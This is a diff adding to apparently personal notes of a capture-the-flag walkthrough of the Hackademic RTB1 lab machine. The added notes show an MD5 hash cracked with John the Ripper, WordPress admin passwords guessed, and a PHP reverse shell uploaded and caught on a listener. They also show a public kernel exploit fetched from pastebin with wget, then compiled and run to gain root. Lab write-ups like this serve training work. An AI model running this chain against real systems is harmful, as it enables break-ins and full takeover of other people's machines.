@@ -1,5 +1,5 @@
 Hackademix.RTB1
-time taken: ~
+time taken: ~ 2 hours 
 
 nmap:
 Starting Nmap 7.40 ( https://nmap.org ) at 2017-05-28 05:44 MDT
@@ -248,8 +248,111 @@ crack johnsmith's password:
 
 hashid + johntheripper for b986448f0bb9e5e124ca91d3d650f52c | JohnSmith 
 
+looks like MD5:
+
+root@kdog:~/ctf_shit/hackademic# john --wordlist=/media/sf_shared_VM/rockyou.txt heshh.txt --format=Raw-MD5
+Using default input encoding: UTF-8
+Loaded 1 password hash (Raw-MD5 [MD5 128/128 AVX 4x3])
+Press 'q' or Ctrl-C to abort, almost any other key for status
+PUPPIES          (JohnSmith)
+1g 0:00:00:00 DONE (2017-05-28 19:22) 3.030g/s 189963p/s 189963c/s 189963C/s SEPTIEMBRE..Mustang1
+Use the "--show" option to display all of the cracked passwords reliably
+Session completed
+
+so its JohnSmith:PUPPIES. does not work for ssh. neither do the other two
+JohnSmith seems to be a normal user. idk why sqlmap didn't crack the hash but w/e
 
 
+Admin seems to be NickJames:admin, but no option to upload files, nor could I get xss working
+
+tried Tony, Max, and Jason, all normal users
+
+bingo, GeorgeMiller:q1w2e3 seems to be the real admin
+
+ok so now let's try to upload a php shell...
+
+Options -> Miscellaneous -> Allow file uploads
+	also add php, zip, and pdf as allowed file extensions just in case
+	also increase maximum file size to 500000 kb
+
+upload a php-reverse-shell in uploads, 
+go to: http://ctf02.root-me.org/Hackademic_RTB1/wp-content/phpreverseshell.php, have a local listener on port 4447,
 
 
+listening on [any] 4447 ...
+connect to [10.0.2.15] from (UNKNOWN) [10.0.2.2] 47024
+Linux HackademicRTB1 2.6.31.5-127.fc12.i686 #1 SMP Sat Nov 7 21:41:45 EST 2009 i686 i686 i386 GNU/Linux
+ 04:57:56 up 33 min,  0 users,  load average: 0.00, 0.00, 0.00
+USER     TTY      FROM              LOGIN@   IDLE   JCPU   PCPU WHAT
+sh-4.0$ id
+uid=48(apache) gid=489(apache) groups=489(apache)
+id
+sh-4.0$ whoami
+whoami
+apache
+sh-4.0$ uname -r
+uname -r
+2.6.31.5-127.fc12.i686
 
+nice, privesc time now
+
+local privesc doesn't seem to work, need tty...
+
+after many, many tries, this worked:
+
+exploit: Linux Kernel 2.6.36-rc8 - 'RDS Protocol' Privilege Escalation:
+ https://www.exploit-db.com/exploits/15285/
+
+sh-4.0$ wget https://pastebin.com/raw/VRtCCyzh --no-check-certificate
+wget https://pastebin.com/raw/VRtCCyzh --no-check-certificate
+--2017-05-29 05:41:56--  https://pastebin.com/raw/VRtCCyzh
+Resolving pastebin.com... 104.20.208.21, 104.20.209.21
+Connecting to pastebin.com|104.20.208.21|:443... connected.
+WARNING: certificate common name `ssl509083.cloudflaressl.com' doesn't match requested host name `pastebin.com'.
+HTTP request sent, awaiting response... 200 OK
+Length: unspecified [text/plain]
+Saving to: `VRtCCyzh'
+
+     0K ......                                                 14.2M=0s
+
+2017-05-29 05:41:56 (14.2 MB/s) - `VRtCCyzh' saved [7085]
+
+sh-4.0$ mv VRtCCyzh exp.c
+mv VRtCCyzh exp.c
+sh-4.0$ gcc -w -o exp exp.c
+gcc -w -o exp exp.c
+sh-4.0$ ./exp
+./exp
+[*] Linux kernel >= 2.6.30 RDS socket exploit
+[*] by Dan Rosenberg
+[*] Resolving kernel addresses...
+ [+] Resolved security_ops to 0xc0aa19ac
+ [+] Resolved default_security_ops to 0xc0955c6c
+ [+] Resolved cap_ptrace_traceme to 0xc055d9d7
+ [+] Resolved commit_creds to 0xc044e5f1
+ [+] Resolved prepare_kernel_cred to 0xc044e452
+[*] Overwriting security ops...
+[*] Linux kernel >= 2.6.30 RDS socket exploit
+[*] by Dan Rosenberg
+[*] Resolving kernel addresses...
+ [+] Resolved security_ops to 0xc0aa19ac
+ [+] Resolved default_security_ops to 0xc0955c6c
+ [+] Resolved cap_ptrace_traceme to 0xc055d9d7
+ [+] Resolved commit_creds to 0xc044e5f1
+ [+] Resolved prepare_kernel_cred to 0xc044e452
+[*] Overwriting security ops...
+[*] Overwriting function pointer...
+[*] Linux kernel >= 2.6.30 RDS socket exploit
+[*] by Dan Rosenberg
+[*] Resolving kernel addresses...
+ [+] Resolved security_ops to 0xc0aa19ac
+ [+] Resolved default_security_ops to 0xc0955c6c
+ [+] Resolved cap_ptrace_traceme to 0xc055d9d7
+ [+] Resolved commit_creds to 0xc044e5f1
+ [+] Resolved prepare_kernel_cred to 0xc044e452
+[*] Overwriting security ops...
+[*] Overwriting function pointer...
+[*] Triggering payload...
+[*] Restoring function pointer...
+id
+uid=0(root) gid=0(root)
